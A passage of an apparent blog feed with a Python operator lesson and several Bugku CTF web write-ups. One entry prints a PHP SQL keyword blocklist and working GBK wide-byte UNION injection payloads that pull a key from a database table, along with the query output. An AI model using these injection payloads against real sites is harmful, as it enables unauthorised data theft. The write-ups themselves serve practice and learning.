class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#逻辑运算符</span></span><br><span class="line">print( <span class="keyword">not</span> <span class="literal">True</span>)</span><br><span class="line">print( <span class="literal">False</span> <span class="keyword">and</span> <span class="literal">True</span>)</span><br><span class="line">print( <span class="literal">True</span> <span class="keyword">and</span> <span class="literal">False</span>)</span><br><span class="line">print( <span class="literal">True</span> <span class="keyword">or</span> <span class="literal">False</span>)  <span class="comment">#or运算符的左侧为True,于是返回True。输出结果</span></span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#逻辑表达式的优先级别</span></span><br><span class="line">print(<span class="string">"not 1 and 0 =&gt;, "</span><span class="keyword">not</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span>)</span><br><span class="line">print(<span class="string">"not (1 and 0) =&gt;"</span>,<span class="keyword">not</span> (<span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span>))</span><br><span class="line">print(<span class="string">"(1 &lt;= 2) and False or True =&gt;"</span>,(<span class="number">1</span> &lt; = <span class="number">2</span>) <span class="keyword">and</span> <span class="literal">False</span> <span class="keyword">or</span> <span class="literal">True</span>)</span><br><span class="line">print(<span class="string">"(1 &gt;= 2) or 1 &gt; 1 + 2 =&gt;"</span>,<span class="number">1</span> &lt;= <span class="number">2</span>,<span class="string">"or"</span>,<span class="number">1</span> &gt; <span class="number">2</span>, <span class="string">"=&gt;"</span>, (<span class="number">1</span> &lt;= <span class="number">2</span>) <span class="keyword">or</span> (<span class="number">1</span> &lt; <span class="number">2</span>))</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not 1 and 0 =&gt;  False</span><br><span class="line">not (1 and 0) =&gt; True</span><br><span class="line">(1 &lt;= 2) and False or True =&gt; True</span><br><span class="line">(1 &gt;= 2) or 1 &gt; 1 + 2 =&gt; True or False =&gt; True</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第2章-Python必须知道的基础语法–数据类型&quot;&gt;&lt;a href=&quot;#第2章-Python必须知道的基础语法–数据类型&quot; class=&quot;headerlink&quot; title=&quot;第2章 Python必须知道的基础语法–数据类型&quot;&gt;&lt;/a&gt;第2章 Python必须知道
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>WEB题--bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/1.WEB2/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/1.WEB2/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T13:51:26.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB题–bugku"><a href="#WEB题–bugku" class="headerlink" title="WEB题–bugku"></a>WEB题–bugku</h1><h2 id="1-WEB2"><a href="#1-WEB2" class="headerlink" title="1.WEB2"></a>1.WEB2</h2><p><strong>第一题为签到题，主要进入有一组滑稽笑脸</strong></p><p>题目连接<a href="http://123.206.87.240:8002/web2/" target="_blank" rel="noopener">http://123.206.87.240:8002/web2/</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.使用F12查看源代码即可找到flag值</span><br><span class="line">flag KEY&#123;Web-2-bugKssNNikls9100&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.查看JS文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.找GET请求响应</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"body"</span> <span class="attr">onLoad</span>=<span class="string">"init()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!flag</span> <span class="attr">KEY</span>&#123;<span class="attr">Web-2-bugKssNNikls9100</span>&#125;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/ThreeCanvas.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/Snow.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB题–bugku&quot;&gt;&lt;a href=&quot;#WEB题–bugku&quot; class=&quot;headerlink&quot; title=&quot;WEB题–bugku&quot;&gt;&lt;/a&gt;WEB题–bugku&lt;/h1&gt;&lt;h2 id=&quot;1-WEB2&quot;&gt;&lt;a href=&quot;#1-WEB2&quot; class=&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>计算器--bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/2.%E8%AE%A1%E7%AE%97%E5%99%A8/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/2.计算器/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T13:51:56.684Z</updated>
    
    <content type="html"><![CDATA[<p># </p><h1 id="2-计算器"><a href="#2-计算器" class="headerlink" title="2.计算器"></a>2.计算器</h1><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>题目连接<a href="http://123.206.87.240:8002/yanzhengma/" target="_blank" rel="noopener">http://123.206.87.240:8002/yanzhengma/</a> </p><p><strong>让你计算一道数学题例如： 95+35=？，但是只能输入一个数字，查看源码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"code"</span> <span class="attr">class</span>=<span class="string">"nocode"</span>&gt;</span>验证码<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"input"</span> <span class="attr">maxlength</span>=<span class="string">"1"</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"check"</span>&gt;</span>验证<span class="tag">&lt;/<span class="name">button</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>来源:<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ctf.bugku.com/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>BugKu-ctf<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery-1.12.3.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/code.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>主要看这一行</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"code"</span> <span class="attr">class</span>=<span class="string">"nocode"</span>&gt;</span>验证码<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"input"</span> <span class="attr">maxlength</span>=<span class="string">"1"</span>/&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>maxlength 属性规定输入字段的最大长度，以字符个数计。</th></tr></thead><tbody><tr><td>maxlength 属性与 <input type="text"> 或 <input type="password"> 配合使用。 type:属性</td></tr></tbody></table><p>因为将字符串定义成了1，所以输入的字符串无法大于1，将此处修改大于你要计算的数值即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;# &lt;/p&gt;
&lt;h1 id=&quot;2-计算器&quot;&gt;&lt;a href=&quot;#2-计算器&quot; class=&quot;headerlink&quot; title=&quot;2.计算器&quot;&gt;&lt;/a&gt;2.计算器&lt;/h1&gt;&lt;h3 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入1(已挂)</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/SQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/SQL注入测试/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:01:54.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入1-已挂"><a href="#SQL注入1-已挂" class="headerlink" title="SQL注入1(已挂)"></a>SQL注入1(已挂)</h1><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><p><strong>访问参数为：?id=x</strong></p><p><strong>查找表为key的数据表，id=1值hash字段值</strong></p><p><strong>代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//过滤sql</span><br><span class="line">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">if (substr_count($id, $value) &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">exit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//xss过滤</span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br></pre></td></tr></table></figure><h4 id="strip-tags（）函数"><a href="#strip-tags（）函数" class="headerlink" title="strip_tags（）函数"></a>strip_tags（）函数</h4><p><strong>剥去字符串中的 HTML 标签： </strong></p><h4 id="当前结果："><a href="#当前结果：" class="headerlink" title="当前结果："></a>当前结果：</h4><table><thead><tr><th>id</th><th>1</th></tr></thead><tbody><tr><td>title</td><td>title</td></tr></tbody></table><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><h4 id="利用宽字节即可"><a href="#利用宽字节即可" class="headerlink" title="利用宽字节即可"></a>利用宽字节即可</h4><h4 id="拿到题以后，还是老套路，and-1-1和and-1-2-看看是否带入查询，但是这个题目在-id-1和-id-1’两种条件下都不报错，查看页面源代码发现gb2312于是尝试宽字节注入。-id-1-bf’-union-select-1-2-23-来确定回显"><a href="#拿到题以后，还是老套路，and-1-1和and-1-2-看看是否带入查询，但是这个题目在-id-1和-id-1’两种条件下都不报错，查看页面源代码发现gb2312于是尝试宽字节注入。-id-1-bf’-union-select-1-2-23-来确定回显" class="headerlink" title="拿到题以后，还是老套路，and 1=1和and 1=2 看看是否带入查询，但是这个题目在?id=1和?id=1’两种条件下都不报错，查看页面源代码发现gb2312于是尝试宽字节注入。?id=1%bf’ union select 1,2%23 来确定回显"></a>拿到题以后，还是老套路，and 1=1和and 1=2 看看是否带入查询，但是这个题目在?id=1和?id=1’两种条件下都不报错，查看页面源代码发现gb2312于是尝试宽字节注入。?id=1%bf’ union select 1,2%23 来确定回显</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27%20union%20select%201,2%23</span><br></pre></td></tr></table></figure><h4 id="1-id-1-bf’-union-select-1-database-23查询数据库名称为sql5，"><a href="#1-id-1-bf’-union-select-1-database-23查询数据库名称为sql5，" class="headerlink" title="1.?id=1%bf’ union select 1,database()%23查询数据库名称为sql5，"></a>1.?id=1%bf’ union select 1,database()%23查询数据库名称为sql5，</h4><p><strong>查询key表，id=1的string字段</strong></p><table><thead><tr><th>id</th><th>1</th></tr></thead><tbody><tr><td>key</td><td>fdsafdasfdsa</td></tr><tr><td>id</td><td>1</td></tr><tr><td>key</td><td>sql5</td></tr></tbody></table><h4 id="2-id-1-bf’-union-select-1-string-from-sql5-key-23-然后查询key表-id-1的string字段。"><a href="#2-id-1-bf’-union-select-1-string-from-sql5-key-23-然后查询key表-id-1的string字段。" class="headerlink" title="2.?id=1%bf’ union select 1,string from sql5.key%23 然后查询key表,id=1的string字段。"></a>2.?id=1%bf’ union select 1,string from sql5.key%23 然后查询key表,id=1的string字段。</h4><table><thead><tr><th>id</th><th>1</th></tr></thead><tbody><tr><td>key</td><td>fdsafdasfdsa</td></tr><tr><td>id</td><td>1</td></tr><tr><td>key</td><td>54f3320dc261f313ba712eb3f13a1f6d</td></tr><tr><td>id</td><td>1</td></tr><tr><td>key</td><td>aaaaaaaaaa</td></tr></tbody></table><p><strong>得到flag，sql注入中的宽字节注入以及绕过等方面的问题可以说是难者不会，会者不难了，只要平时多学多练，这类题就会成为你的送分题。 </strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入1-已挂&quot;&gt;&lt;a href=&quot;#SQL注入1-已挂&quot; class=&quot;headerlink&quot; title=&quot;SQL注入1(已挂)&quot;&gt;&lt;/a&gt;SQL注入1(已挂)&lt;/h1&gt;&lt;h4 id=&quot;题目：&quot;&gt;&lt;a href=&quot;#题目：&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>WEB3-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/WEB3/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/WEB3/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:10:35.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="6-WEB3"><a href="#6-WEB3" class="headerlink" title="6.WEB3"></a>6.WEB3</h1><p>链接：<a href="http://123.206.87.240:8002/web3/" target="_blank" rel="noopener">http://123.206.87.240:8002/web3/</a> </p><p><strong>是一个简单的XSS循环,构造了大量的alert函数</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>BKCTF-WEB3<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="undefined">alert("flag就在这里");  </span></span><br><span class="line"><span class="undefined">alert("来找找吧"); </span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span 